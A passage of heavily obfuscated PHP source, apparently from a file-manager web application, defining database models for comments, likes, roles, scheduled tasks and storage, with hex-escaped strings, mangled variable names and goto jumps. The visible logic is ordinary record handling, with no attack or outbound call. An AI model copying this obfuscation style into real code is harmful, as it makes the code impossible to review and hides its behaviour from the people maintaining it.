Task::kill($Ó¥ÈÄ‹»[$şüåõôĞ[468]]); $×û£êø¿ = !0; $Ó¥ÈÄ‹» = !1; } } } return $Ò±±îûÒ; } public function restore() { $µÙñ®¦Û =& $_SERVER[è¶³ÒßÑ]; ActionCall($µÙñ®¦Û[1113], !0, 1); ActionCall($µÙñ®¦Û[1113], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\156\x74"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\155\x65" => "\143\x6f\x6d\155\145\156\164\x5f\x6d\145\x74\x61", "\155\145\x74\141\106\x69\x65\x6c\144" => "\x63\157\155\x6d\x65\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ûÂÔÓİ) { $úÔÀ­Á± =& $_SERVER[è¶³ÒßÑ]; if ($ûÂÔÓİ[$úÔÀ­Á±[1988]]) { $Ò»œ†â¢ = $this->where(array($úÔÀ­Á±[1989] => $ûÂÔÓİ[$úÔÀ­Á±[1988]]))->find(); if (!$Ò»œ†â¢ || $Ò»œ†â¢[$úÔÀ­Á±[200]] != $ûÂÔÓİ[$úÔÀ­Á±[200]] || $Ò»œ†â¢[$úÔÀ­Á±[562]] != $ûÂÔÓİ[$úÔÀ­Á±[562]]) { return !1; } $this->where(array($úÔÀ­Á±[1989] => $ûÂÔÓİ[$úÔÀ­Á±[1988]]))->setAdd($úÔÀ­Á±[1990], 1); } $ûÂÔÓİ[$úÔÀ­Á±[1991]] = 0; $ûÂÔÓİ[$úÔÀ­Á±[1990]] = 0; $ûÂÔÓİ[$úÔÀ­Á±[804]] = 1; return $this->add($ûÂÔÓİ); } public function commentCount($Õª©ÂÎê, $Ï´…âË±, $‚‰Íå®º = false) { $Òæš÷µ =& $_SERVER[è¶³ÒßÑ]; if (!$Õª©ÂÎê) { return array(); } if (is_string($Õª©ÂÎê) || is_int($Õª©ÂÎê)) { $Õª©ÂÎê = array($Õª©ÂÎê); } $Òƒ‹°È« = array($Òæš÷µ[562], $Òæš÷µ[1992] => $Òæš÷µ[558]); $¿ô‚ÀòÍ = array($Òæš÷µ[562] => array($Òæš÷µ[7], $Õª©ÂÎê), $Òæš÷µ[200] => $Ï´…âË±); if ($‚‰Íå®º) { $¿ô‚ÀòÍ[$Òæš÷µ[1761]] = $‚‰Íå®º; } $´Àô¦³â = $this->field($Òƒ‹°È«)->where($¿ô‚ÀòÍ)->group($Òæš÷µ[562])->select(); return array_to_keyvalue($´Àô¦³â, $Òæš÷µ[562], $Òæš÷µ[558]); } public function starTarget($üé¥æ’’, $’È‹ñíÚ) { $ÆúÀœì =& $_SERVER[è¶³ÒßÑ]; $úí‡Îéİ = $üé¥æ’’ + self::TYPE_STAR_OFFSET; $ôëŠ£ = array($ÆúÀœì[1761] => USER_ID, $ÆúÀœì[200] => $úí‡Îéİ, $ÆúÀœì[562] => $’È‹ñíÚ); $ğ†¼¡Å‘ = $this->where($ôëŠ£)->find(); if ($ğ†¼¡Å‘) { return $this->where(array($ÆúÀœì[468] => $ğ†¼¡Å‘[$ÆúÀœì[468]]))->delete(); } $ıù§¹Ëé = array($ÆúÀœì[1988] => 0, $ÆúÀœì[1761] => USER_ID, $ÆúÀœì[804] => 1, $ÆúÀœì[181] => $ÆúÀœì[12], $ÆúÀœì[200] => $úí‡Îéİ, $ÆúÀœì[562] => $’È‹ñíÚ, $ÆúÀœì[1991] => 0, $ÆúÀœì[1990] => 0); return $this->add($ıù§¹Ëé); } public function starTargetCount($§É‡ş, $“Æ¼ëìÌ) { $Èí¶ø¿ò =& $_SERVER[è¶³ÒßÑ]; $ßÙ«ÁÑ = $“Æ¼ëìÌ + self::TYPE_STAR_OFFSET; $Í‰¥ÌâÚ = $this->commentCount($§É‡ş, $ßÙ«ÁÑ); $üş¯ƒÓŸ = $this->commentCount($§É‡ş, $ßÙ«ÁÑ, USER_ID); return array($Èí¶ø¿ò[1993] => $Í‰¥ÌâÚ, $Èí¶ø¿ò[1994] => $üş¯ƒÓŸ); } public function starTargetUserList($ñ»Û¡·ã, $–©â¶ø») { $ ¶àÍ©¾ =& $_SERVER[è¶³ÒßÑ]; $÷··¯ü¬ = $ñ»Û¡·ã + self::TYPE_STAR_OFFSET; $æ¯èÍ‚İ = array($ ¶àÍ©¾[562] => $–©â¶ø», $ ¶àÍ©¾[200] => $÷··¯ü¬); $ÖÀ“˜˜Ë = $this->where($æ¯èÍ‚İ)->count(); $Á¤æïÈ† = array($ ¶àÍ©¾[325] => $ÖÀ“˜˜Ë, $ ¶àÍ©¾[1995] => array()); if (!$ÖÀ“˜˜Ë) { return $Á¤æïÈ†; } $¡§‚†ùÍ = $this->field($ ¶àÍ©¾[1761])->where($æ¯èÍ‚İ)->limit(500)->select(); $¡§‚†ùÍ = array_to_keyvalue($¡§‚†ùÍ, $ ¶àÍ©¾[12], $ ¶àÍ©¾[1761]); $Á¤æïÈ†[$ ¶àÍ©¾[1995]] = Model($ ¶àÍ©¾[570])->userListInfo($¡§‚†ùÍ); return $Á¤æïÈ†; } public function prasiseUserList($‡ôŸàÓ) { $Áº…¯ =& $_SERVER[è¶³ÒßÑ]; $‚´Óï‡ = array($Áº…¯[1996] => $‡ôŸàÓ); $®Êá–ÎÜ = $this->where($‚´Óï‡)->find(); $•×‰˜ë¿ = _get($®Êá–ÎÜ, $Áº…¯[1991], 0); $Ê®úùá = array($Áº…¯[325] => $•×‰˜ë¿, $Áº…¯[1995] => array()); if (!$•×‰˜ë¿) { return $Ê®úùá; } $‚£’÷¶ = Model($Áº…¯[1997])->field($Áº…¯[1761])->where($‚´Óï‡)->limit(500)->select(); $‚£’÷¶ = array_to_keyvalue($‚£’÷¶, $Áº…¯[12], $Áº…¯[1761]); $Ê®úùá[$Áº…¯[1995]] = Model($Áº…¯[570])->userListInfo($‚£’÷¶); return $Ê®úùá; } public function remove($½ÙÑåèË) { $¢±¶·Í =& $_SERVER[è¶³ÒßÑ]; $ûıÊÓ¯õ = array($¢±¶·Í[1989] => $½ÙÑåèË); $šÒ–ã—¼ = $this->where($ûıÊÓ¯õ)->find(); if ($šÒ–ã—¼[$¢±¶·Í[1988]]) { $this->where(array($¢±¶·Í[1989] => $šÒ–ã—¼[$¢±¶·Í[1988]]))->setAdd($¢±¶·Í[1990], -1); } return $this->where($ûıÊÓ¯õ)->delete(); } public function edit($äçæ±ˆ, $ñÚÀòöå) { $˜âüß¬ =& $_SERVER[è¶³ÒßÑ]; $¿Šãè‰Ø = array($˜âüß¬[1989] => $äçæ±ˆ); return $this->where($¿Šãè‰Ø)->save(array($˜âüß¬[1998] => $ñÚÀòöå)); } public function prasise($ØªÁäôü) { $‹Ê…ƒå® =& $_SERVER[è¶³ÒßÑ]; $Ã¯ªÉö  = Model($‹Ê…ƒå®[1999]); $”û©¶Çø = array($‹Ê…ƒå®[1989] => $ØªÁäôü, $‹Ê…ƒå®[1752] => USER_ID); $Ú°í‰Ç = $Ã¯ªÉö ->where($”û©¶Çø)->find(); if (!$Ú°í‰Ç) { $Ã¯ªÉö ->add($”û©¶Çø); $ä¼ÅÊ—° = $this->where(array($‹Ê…ƒå®[1989] => $ØªÁäôü))->setAdd($‹Ê…ƒå®[1991], 1); } else { $Ã¯ªÉö ->where($”û©¶Çø)->delete(); $ä¼ÅÊ—° = $this->where(array($‹Ê…ƒå®[1989] => $ØªÁäôü))->setAdd($‹Ê…ƒå®[1991], -1); } return $ä¼ÅÊ—°; } public function targetInfo($¼ÇêÓ‹, $²†ËÓºš) { $çÊ¬ “ =& $_SERVER[è¶³ÒßÑ]; $Õï¶¥½£ = array($çÊ¬ “[641] => $¼ÇêÓ‹, $çÊ¬ “[642] => $²†ËÓºš); $‚Ì“Ãô = $this->where($Õï¶¥½£)->count(); $›Õ‡æ² = "\x52\111\107\110\124\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\143\157\155\155\145\156\x74\137\160\162\x61\x69\x73\x65\40\x73\x74\x61\x72\40\157\x6e\40\143\157\x6d\x6d\145\156\164\56\143\157\x6d\155\145\x6e\164\111\104\40\75\40\x73\164\x61\162\56\x63\x6f\x6d\155\145\x6e\164\x49\104"; $²Ş¦„ÚÜ = $this->alias($çÊ¬ “[423])->where($Õï¶¥½£)->join($›Õ‡æ², $çÊ¬ “[2000])->count(); $ãà¨ãÁ¾ = array($çÊ¬ “[2001] => $‚Ì“Ãô, $çÊ¬ “[2002] => $²Ş¦„ÚÜ); return $ãà¨ãÁ¾; } public function listData($¡ÈÕ¥ñ) { $†îİŸš =& $_SERVER[è¶³ÒßÑ]; if (isset($¡ÈÕ¥ñ[$†îİŸš[2003]])) { if ($¡ÈÕ¥ñ[$†îİŸš[2003]]) { $¡ÈÕ¥ñ[$†îİŸš[1996]] = array($†îİŸš[1067], intval($¡ÈÕ¥ñ[$†îİŸš[2003]])); } unset($¡ÈÕ¥ñ[$†îİŸš[2003]]); } if (isset($¡ÈÕ¥ñ[$†îİŸš[2004]])) { if ($¡ÈÕ¥ñ[$†îİŸš[2004]]) { $¡ÈÕ¥ñ[$†îİŸš[1996]] = array($†îİŸš[1064], intval($¡ÈÕ¥ñ[$†îİŸš[2004]])); } unset($¡ÈÕ¥ñ[$†îİŸš[2004]]); } return $this->_listData($¡ÈÕ¥ñ); } private function _listData($ºö¬š) { $¿ŠòòÊÕ =& $_SERVER[è¶³ÒßÑ]; $´Ş‚èŞû = $this->where($ºö¬š)->_makeOrder()->selectPage(100); $this->_listAppendParent($´Ş‚èŞû[$¿ŠòòÊÕ[438]]); $this->_listAppendUser($´Ş‚èŞû[$¿ŠòòÊÕ[438]]); $this->_listAppendMeta($´Ş‚èŞû[$¿ŠòòÊÕ[438]]); return $´Ş‚èŞû; } private function _makeOrder() { $çôŸ¥‡Û =& $_SERVER[è¶³ÒßÑ]; $óÈèé°÷ = array($çôŸ¥‡Û[1991], $çôŸ¥‡Û[1990], $çôŸ¥‡Û[241]); $æ„ó‰ø = Input::get($çôŸ¥‡Û[523], $çôŸ¥‡Û[7], $çôŸ¥‡Û[490], $óÈèé°÷); $ìÃ³È•½ = Input::get($çôŸ¥‡Û[524], $çôŸ¥‡Û[7], $çôŸ¥‡Û[1754], array($çôŸ¥‡Û[2005], $çôŸ¥‡Û[519])); $ŠèÌËû« = $æ„ó‰ø . $çôŸ¥‡Û[53] . $ìÃ³È•½; return $this->order($ŠèÌËû«); } private function _listAppendParent(&$¼šÜÁ‹·) { $áú‰‘ê =& $_SERVER[è¶³ÒßÑ]; $æêóï›ğ = array_unique(array_to_keyvalue($¼šÜÁ‹·, $áú‰‘ê[12], $áú‰‘ê[1988])); $æêóï›ğ = array_remove_value($æêóï›ğ, $áú‰‘ê[238]); if (!$æêóï›ğ) { return; } $Ñ´Ù±Ø’ = $this->where(array($áú‰‘ê[1989] => array($áú‰‘ê[7], $æêóï›ğ)))->select(); $Ñ´Ù±Ø’ = array_to_keyvalue($Ñ´Ù±Ø’, $áú‰‘ê[1996]); foreach ($¼šÜÁ‹· as &$á÷û…¾Ò) { if (isset($Ñ´Ù±Ø’[$á÷û…¾Ò[$áú‰‘ê[1988]]])) { $á÷û…¾Ò[$áú‰‘ê[2006]] = $Ñ´Ù±Ø’[$á÷û…¾Ò[$áú‰‘ê[1988]]]; } } unset($á÷û…¾Ò); } private function _listAppendUser(&$£áˆôÌš) { $×™ÇÔÑ =& $_SERVER[è¶³ÒßÑ]; $õ†’ÅæÇ = array_unique(array_to_keyvalue($£áˆôÌš, $×™ÇÔÑ[12], $×™ÇÔÑ[1761])); $õ†’ÅæÇ = array_remove_value($õ†’ÅæÇ, $×™ÇÔÑ[238]); if (count($õ†’ÅæÇ) == 0) { return; } foreach ($£áˆôÌš as $Ùš‘ÚÑ») { if (isset($Ùš‘ÚÑ»[$×™ÇÔÑ[2006]])) { $õ†’ÅæÇ[] = $Ùš‘ÚÑ»[$×™ÇÔÑ[2006]][$×™ÇÔÑ[1761]]; } } $åüêİ†– = Model($×™ÇÔÑ[591])->userListInfo($õ†’ÅæÇ); foreach ($£áˆôÌš as &$Ùš‘ÚÑ») { $Ùš‘ÚÑ»[$×™ÇÔÑ[655]] = $åüêİ†–[$Ùš‘ÚÑ»[$×™ÇÔÑ[1761]]]; if (isset($Ùš‘ÚÑ»[$×™ÇÔÑ[2006]])) { $Ùš‘ÚÑ»[$×™ÇÔÑ[2006]][$×™ÇÔÑ[655]] = $åüêİ†–[$Ùš‘ÚÑ»[$×™ÇÔÑ[2006]][$×™ÇÔÑ[1761]]]; } } unset($Ùš‘ÚÑ»); } private function _listAppendMeta(&$ÈºàÙ»ü) { $ÚæÁšÍÍ =& $_SERVER[è¶³ÒßÑ]; $©•¡íœ = array_unique(array_to_keyvalue($ÈºàÙ»ü, $ÚæÁšÍÍ[12], $ÚæÁšÍÍ[1996])); $©•¡íœ = array_remove_value($©•¡íœ, $ÚæÁšÍÍ[238]); if (!$©•¡íœ) { return; } foreach ($ÈºàÙ»ü as $ğ°ÊÈ’) { if (isset($ğ°ÊÈ’[$ÚæÁšÍÍ[2006]])) { $©•¡íœ[] = $ğ°ÊÈ’[$ÚæÁšÍÍ[2006]][$ÚæÁšÍÍ[1996]]; } } $¾ š’êò = $this->metaList($©•¡íœ); if (!$¾ š’êò) { return !1; } foreach ($ÈºàÙ»ü as &$ğ°ÊÈ’) { $ğ°ÊÈ’[$ÚæÁšÍÍ[532]] = $¾ š’êò[$ğ°ÊÈ’[$ÚæÁšÍÍ[1996]]]; if (isset($ğ°ÊÈ’[$ÚæÁšÍÍ[2006]])) { $ğ°ÊÈ’[$ÚæÁšÍÍ[2006]][$ÚæÁšÍÍ[532]] = $¾ š’êò[$ğ°ÊÈ’[$ÚæÁšÍÍ[2006]][$ÚæÁšÍÍ[1996]]]; } } unset($ğ°ÊÈ’); } private function metaList($ïÉ±Ï£…) { $—·üÖÍĞ =& $_SERVER[è¶³ÒßÑ]; if (!$ïÉ±Ï£…) { return array(); } $ÍÖö±¶Ï = array($—·üÖÍĞ[1996] => array($—·üÖÍĞ[7], $ïÉ±Ï£…)); $¡Ô·¥æ‡ = Model($—·üÖÍĞ[2007])->where($ÍÖö±¶Ï)->select(); $¡Ô·¥æ‡ = array_to_keyvalue_group($¡Ô·¥æ‡, $—·üÖÍĞ[1996]); foreach ($¡Ô·¥æ‡ as $§±­°úú => $²ï¶³à) { $õÉéñæ = array(); foreach ($²ï¶³à as $Ì¤ƒı®”) { $õÉéñæ[$Ì¤ƒı®”[$—·üÖÍĞ[107]]] = $Ì¤ƒı®”[$—·üÖÍĞ[443]]; } $¡Ô·¥æ‡[$§±­°úú] = $õÉéñæ; } return $¡Ô·¥æ‡ ? $¡Ô·¥æ‡ : array(); } public function removeTarget($ÀÄ•Ë„, $†œú´½‰) { $‡ûÊãµİ =& $_SERVER[è¶³ÒßÑ]; if (!$†œú´½‰) { return !0; } $†œú´½‰ = is_array($†œú´½‰) ? $†œú´½‰ : array($†œú´½‰); $Ğêåê· = array($‡ûÊãµİ[200] => $ÀÄ•Ë„, $‡ûÊãµİ[562] => array($‡ûÊãµİ[7], $†œú´½‰)); $è¡ãã‚€ = $this->field($‡ûÊãµİ[1996])->where($Ğêåê·)->select(); $é¦Ù‘İô = array_to_keyvalue($è¡ãã‚€, $‡ûÊãµİ[12], $‡ûÊãµİ[1996]); if (!$é¦Ù‘İô) { return !0; } $Ğêåê· = array($‡ûÊãµİ[1996] => array($‡ûÊãµİ[7], $é¦Ù‘İô)); $this->where($Ğêåê·)->delete(); Model($‡ûÊãµİ[1999])->where($Ğêåê·)->delete(); Model($‡ûÊãµİ[2008])->where($Ğêåê·)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\x6c\x65\x5f\143\157\x6e\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\x69\x6d\x65", "\164\151\155\145", "\151\156\163\x65\x72\x74", "\x66\x75\x6e\x63\164\151\x6f\156")); } goto f¼•ğÛ‰ğ; eêÊ™ğÜ‰: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\162\x6f\154\145\114\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\141\165\x74\150", "\x6c\x61\142\x65\x6c", "\144\x69\x73\160\x6c\141\171", "\163\x79\163\164\145\x6d", "\x64\145\x73\143", "\x69\x67\x6e\157\162\145\105\170\x74", "\151\147\156\x6f\x72\x65\106\151\154\x65\x53\x69\x7a\145", "\x61\x64\x6d\x69\x6e\x69\x73\x74\162\x61\164\x6f\162", "\163\157\162\x74"); public function listData($ı•À€¯É = false, $Ä¯ÉË©‡ = "\163\x6f\162\x74", $·“Ø²Ô§ = false) { $ö¡Û™É =& $_SERVER[è¶³ÒßÑ]; $¼ãÍÛôİ = parent::listData($ı•À€¯É, $Ä¯ÉË©‡, $·“Ø²Ô§); if (!$ı•À€¯É) { foreach ($¼ãÍÛôİ as $ÀÍÀ“°ï => $±¹û¾ÒÚ) { if ($±¹û¾ÒÚ[$ö¡Û™É[2166]] == 1) { $¼ãÍÛôİ[$ÀÍÀ“°ï][$ö¡Û™É[519]] = LNG($ö¡Û™É[2427]); } } } return $¼ãÍÛôİ; } public function update($ÔÓòÎÊ, $îÖà¸œ¦) { $Ú¼ÊÆ… =& $_SERVER[è¶³ÒßÑ]; $ó˜‰ü‰ = parent::listData($ÔÓòÎÊ); $õá™úğÑ = $this->findByName($îÖà¸œ¦[$Ú¼ÊÆ…[32]]); if (!$ó˜‰ü‰ || $õá™úğÑ && $õá™úğÑ[$Ú¼ÊÆ…[468]] != $ó˜‰ü‰[$Ú¼ÊÆ…[468]]) { return !1; } if ($õá™úğÑ[$Ú¼ÊÆ…[2166]] == 1) { $îÖà¸œ¦ = array($Ú¼ÊÆ…[32] => $îÖà¸œ¦[$Ú¼ÊÆ…[32]], $Ú¼ÊÆ…[1982] => $îÖà¸œ¦[$Ú¼ÊÆ…[1982]]); } $this->filterAuth($îÖà¸œ¦[$Ú¼ÊÆ…[480]]); return parent::update($ÔÓòÎÊ, $îÖà¸œ¦); } public function remove($¿â²—²·) { $ö¦ü‚•Ç = parent::listData($¿â²—²·); if (!$ö¦ü‚•Ç || $ö¦ü‚•Ç[$_SERVER[è¶³ÒßÑ][201]]) { return !1; } return parent::remove($¿â²—²·); } public function add($ÜäŠÕŸ) { $¶îÂÆ‘ =& $_SERVER[è¶³ÒßÑ]; $ï¨¾üÔù = $ÜäŠÕŸ[$¶îÂÆ‘[32]]; if ($this->findByName($ï¨¾üÔù)) { return !1; } $™«—ôëË = array($¶îÂÆ‘[487] => $ï¨¾üÔù, $¶îÂÆ‘[1965] => $¶îÂÆ‘[12], $¶îÂÆ‘[1961] => $¶îÂÆ‘[1969], $¶îÂÆ‘[2428] => 1, $¶îÂÆ‘[1964] => 0, $¶îÂÆ‘[2429] => 0, $¶îÂÆ‘[1963] => $this->getSort()); $ÜäŠÕŸ = array_merge($™«—ôëË, $ÜäŠÕŸ); $this->filterAuth($ÜäŠÕŸ[$¶îÂÆ‘[480]]); return parent::insert($ÜäŠÕŸ); } private function getSort() { $½ã²™¯ =& $_SERVER[è¶³ÒßÑ]; $”Ÿ¾·»± = parent::listData(); $œà³…¾é = array_to_keyvalue($”Ÿ¾·»±, $½ã²™¯[12], $½ã²™¯[1983]); return empty($œà³…¾é) ? 0 : max($œà³…¾é) + 1; } private function filterAuth(&$øÁÀÉı) { $†Å‡®‹µ =& $_SERVER[è¶³ÒßÑ]; $ã´ª¨­µ = array(); $ç›Èóı = array_filter(explode($†Å‡®‹µ[50], $øÁÀÉı)); foreach ($ç›Èóı as $øÁÀÉı) { $—ğéşä = explode($†Å‡®‹µ[10], $øÁÀÉı); if ($—ğéşä[0] == $†Å‡®‹µ[2430] && $—ğéşä[1] != $†Å‡®‹µ[1250]) { $“ç÷úè· = $—ğéşä[0] . $†Å‡®‹µ[10] . $—ğéşä[1] . $†Å‡®‹µ[2431]; if (!in_array($“ç÷úè·, $ç›Èóı)) { $ã´ª¨­µ[] = $“ç÷úè·; } } $ã´ª¨­µ[] = $øÁÀÉı; } $øÁÀÉı = implode($†Å‡®‹µ[50], $ã´ª¨­µ); } public function findRoleDefault() { $œ™³Ï€Ì =& $_SERVER[è¶³ÒßÑ]; $Å¦ÍËÀù = parent::listData(); $ïñ¸¡¦ş = !1; foreach ($Å¦ÍËÀù as $…éŞ¼ïÕ) { if (!$…éŞ¼ïÕ || $…éŞ¼ïÕ[$œ™³Ï€Ì[1981]] == $œ™³Ï€Ì[238] || $…éŞ¼ïÕ[$œ™³Ï€Ì[2166]] == 1) { continue; } if (strstr($…éŞ¼ïÕ[$œ™³Ï€Ì[480]], $œ™³Ï€Ì[2432])) { continue; } if (!strstr($…éŞ¼ïÕ[$œ™³Ï€Ì[480]], $œ™³Ï€Ì[2433])) { continue; } if (!$ïñ¸¡¦ş) { $ïñ¸¡¦ş = $…éŞ¼ïÕ; continue; } $üŒƒúš¯ = explode($œ™³Ï€Ì[50], $ïñ¸¡¦ş[$œ™³Ï€Ì[480]]); $à¥üûÂâ = explode($œ™³Ï€Ì[50], $…éŞ¼ïÕ[$œ™³Ï€Ì[480]]); if (count($üŒƒúš¯) > count($à¥üûÂâ)) { $ïñ¸¡¦ş = $…éŞ¼ïÕ; } } return $ïñ¸¡¦ş ? $ïñ¸¡¦ş[$œ™³Ï€Ì[468]] : $œ™³Ï€Ì[12]; } public function sort($‰³×¦Š¢, $÷ˆµõ–ù) { return parent::update($‰³×¦Š¢, $÷ˆµõ–ù); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\x74\x61\x73\153\114\x69\163\164"; public $field = array("\156\141\155\145", "\164\171\x70\145", "\x65\x76\x65\x6e\164", "\164\151\x6d\145", "\x64\x65\163\143", "\163\x79\x73\x74\x65\155", "\145\x6e\141\142\154\x65", "\x6c\141\163\164\x52\x75\x6e", "\x73\157\x72\x74"); public function listData($öï˜›£ = false, $†áè±ÈÏ = "\x73\x6f\162\164", $¾ş¹öÈ» = false) { return parent::listData($öï˜›£, $†áè±ÈÏ, $¾ş¹öÈ»); } public function add($Õ½Ïö¦) { $ÖÔ±¢ƒÚ =& $_SERVER[è¶³ÒßÑ]; $íËã¯Ş = $this->findByName($Õ½Ïö¦[$ÖÔ±¢ƒÚ[32]]); if ($íËã¯Ş) { return !1; } $Õ½Ïö¦[$ÖÔ±¢ƒÚ[1712]] = 0; $Õ½Ïö¦[$ÖÔ±¢ƒÚ[1983]] = $this->getSort(); return parent::insert($Õ½Ïö¦); } private function getSort() { $Ç¸Ù±’ =& $_SERVER[è¶³ÒßÑ]; $ÅäÄœ½‘ = parent::listData(); $»ùÍ¹ò = array_to_keyvalue($ÅäÄœ½‘, $Ç¸Ù±’[12], $Ç¸Ù±’[1983]); return empty($»ùÍ¹ò) ? 0 : max($»ùÍ¹ò) + 1; } public function update($ûí¯•×É, $¶Ğ†¦ Ê) { $ŸÀÅˆ´ =& $_SERVER[è¶³ÒßÑ]; $¯˜“Ñ½« = $this->listData($ûí¯•×É); $ˆš›‰ÊÊ = $this->findByName($¶Ğ†¦ Ê[$ŸÀÅˆ´[32]]); if (!$¯˜“Ñ½« || $ˆš›‰ÊÊ && $ˆš›‰ÊÊ[$ŸÀÅˆ´[468]] != $¯˜“Ñ½«[$ŸÀÅˆ´[468]]) { return !1; } return parent::update($ûí¯•×É, $¶Ğ†¦ Ê); } public function remove($Ò—‚Òëç, $É…€¡„¶ = false) { $ì§ë¢÷è =& $_SERVER[è¶³ÒßÑ]; $àˆ¦ÙÏ˜ = $this->listData($Ò—‚Òëç); if (!$àˆ¦ÙÏ˜) { return; } if (!$É…€¡„¶ && $àˆ¦ÙÏ˜[$ì§ë¢÷è[201]] == $ì§ë¢÷è[101]) { return !1; } return parent::remove($Ò—‚Òëç); } public function enable($ò†ù•¦, $É†”õêï) { return $this->update($ò†ù•¦, array($_SERVER[è¶³ÒßÑ][2422] => $É†”õêï)); } public function run($üıÓ) { return $this->update($üıÓ, array($_SERVER[è¶³ÒßÑ][2434] => time())); } } goto eÛÀİ¸©¡; bî¯íÃšù: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x73\x6f\x75\162\x63\145\x53\x65\x63\162\x65\x74\x4c\x69\x73\164"; public $field = array("\x73\x6f\165\x72\x63\145\111\x44", "\x74\171\x70\x65\111\104", "\x63\x72\145\141\164\145\x55\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\163\164\157\162\x61\147\x65\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x73\151\172\145\x4d\x61\170", "\x73\171\x73\x74\145\x6d", "\x64\145\146\141\165\x6c\164", "\144\x72\151\x76\x65\162", "\x63\157\156\x66\151\x67"); public function listData($¡„‡¬ÎÚ = false, $üÓÊü©½ = "\x6d\x6f\144\x69\x66\171\x54\x69\155\145", $ºãàÊ¸ = false) { $ú¬ıÙÌ½ =& $_SERVER[è¶³ÒßÑ]; $¥ˆßß¶º = parent::listData($¡„‡¬ÎÚ, $üÓÊü©½, $ºãàÊ¸); if ($¡„‡¬ÎÚ) { return $¥ˆßß¶º; } $³œÓëİù = array(); if ($GLOBALS[$ú¬ıÙÌ½[2285]]) { $³œÓëİù = $this->ioSizeUseGet(array_to_keyvalue($¥ˆßß¶º, $ú¬ıÙÌ½[12], $ú¬ıÙÌ½[468])); } foreach ($¥ˆßß¶º as $Ë÷Ï–İá => $Ì¦ıÎõŸ) { unset($¥ˆßß¶º[$Ë÷Ï–İá][$ú¬ıÙÌ½[6]]); $¥ˆßß¶º[$Ë÷Ï–İá][$ú¬ıÙÌ½[1948]] = isset($³œÓëİù[$Ì¦ıÎõŸ[$ú¬ıÙÌ½[468]]]) ? $³œÓëİù[$Ì¦ıÎõŸ[$ú¬ıÙÌ½[468]]] : 0; } return $¥ˆßß¶º; } public function ioSizeUseGet($—èŠ¿¤ö) { $Üışü½¤ =& $_SERVER[è¶³ÒßÑ]; if (!$—èŠ¿¤ö) { return array(); } $Å’®Ôã’ = $Üışü½¤[2286] . implode($Üışü½¤[50], $—èŠ¿¤ö); $Â›ë¥êÇ = Cache::get($Å’®Ôã’); if ($Â›ë¥êÇ) { return $Â›ë¥êÇ; } $¹›¥Š‘í = array($Üışü½¤[871] => $Üışü½¤[468], $Üışü½¤[2287] => $Üışü½¤[89]); $·ï²¹‚¶ = array($Üışü½¤[871] => array($Üışü½¤[7], $—èŠ¿¤ö)); $Â›ë¥êÇ = Model($Üışü½¤[843])->field($¹›¥Š‘í)->where($·ï²¹‚¶)->group($Üışü½¤[871])->select(); $Â›ë¥êÇ = array_to_keyvalue($Â›ë¥êÇ, $Üışü½¤[468], $Üışü½¤[89]); Cache::set($Å’®Ôã’, $Â›ë¥êÇ, 600); return $Â›ë¥êÇ; } public function getConfig($‹çµô¢¨) { $•êêãìû = parent::listData($‹çµô¢¨); return json_decode($•êêãìû[$_SERVER[è¶³ÒßÑ][6]], !0); } public function update($©Ñ½ú, $‚‰‰¢¸) { $ó•¢ó¾ª =& $_SERVER[è¶³ÒßÑ]; $î©¶˜” = $‚‰‰¢¸[$ó•¢ó¾ª[32]]; $âˆŒ‚çÔ = array_to_keyvalue(parent::listData(), $ó•¢ó¾ª[32]); if (isset($âˆŒ‚çÔ[$î©¶˜”]) && $âˆŒ‚çÔ[$î©¶˜”][$ó•¢ó¾ª[468]] != $©Ñ½ú) { return !1; } $this->checkPwd($©Ñ½ú, $‚‰‰¢¸); if (isset($‚‰‰¢¸[$ó•¢ó¾ª[2288]]) && $‚‰‰¢¸[$ó•¢ó¾ª[2288]] == $ó•¢ó¾ª[101]) { $this->checkConfig($‚‰‰¢¸); } unset($‚‰‰¢¸[$ó•¢ó¾ª[2288]]); $³†ŒşÉ³ = parent::update($©Ñ½ú, $‚‰‰¢¸); if ($³†ŒşÉ³ && $‚‰‰¢¸[$ó•¢ó¾ª[37]]) { $ÛıŒ›·„ = 0; foreach ($âˆŒ‚çÔ as $¡Ò•–Ó·) { if ($¡Ò•–Ó·[$ó•¢ó¾ª[37]] && $¡Ò•–Ó·[$ó•¢ó¾ª[468]] != $©Ñ½ú) { $ÛıŒ›·„ = $¡Ò•–Ó·[$ó•¢ó¾ª[468]]; parent::update($¡Ò•–Ó·[$ó•¢ó¾ª[468]], array($ó•¢ó¾ª[37] => 0)); } } $this->updateBackup($©Ñ½ú, $ÛıŒ›·„); } return $³†ŒşÉ³; } public function add($¡øŸ³šî) { $Œ”ïÆÓÀ =& $_SERVER[è¶³ÒßÑ]; $Û­ÊÅÌ’ = array_to_keyvalue(parent::listData(), $Œ”ïÆÓÀ[32]); if (isset($Û­ÊÅÌ’[$¡øŸ³šî[$Œ”ïÆÓÀ[32]]])) { return !1; } $this->checkConfig($¡øŸ³šî); $œÏİëÊç = parent::insert($¡øŸ³šî); if ($œÏİëÊç && $¡øŸ³šî[$Œ”ïÆÓÀ[37]]) { foreach ($Û­ÊÅÌ’ as $›¸—…Ò€) { if ($›¸—…Ò€[$Œ”ïÆÓÀ[37]]) { parent::update($›¸—…Ò€[$Œ”ïÆÓÀ[468]], array($Œ”ïÆÓÀ[37] => 0)); } } } return $œÏİëÊç; } public function updateBackup($·ıßŒ‰÷, $ËÀğşÉş) { 